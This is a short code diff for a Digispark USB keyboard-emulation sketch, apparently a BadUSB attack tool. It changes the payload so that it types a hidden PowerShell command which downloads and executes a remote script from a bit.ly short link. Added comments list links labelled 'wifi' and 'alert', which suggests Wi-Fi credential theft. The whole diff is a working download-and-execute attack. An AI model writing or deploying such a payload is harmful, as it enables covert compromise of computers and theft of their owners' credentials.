@@ -8,8 +8,12 @@ void winRun(const char* command){
 
 void downloadAndRun(){
   DigiKeyboard.delay(500);
-  winRun("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('jakiesip/plik.ps1');\"");
+  winRun("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HVeXwZ');\"");
 }
+
+/// wifi : https://bit.ly/3HVeXwZ
+/// alert: https://bit.ly/3sPIkL7
+// powershell -W Hidden "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HVeXwZ');"
 void setup() {
   DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(0);
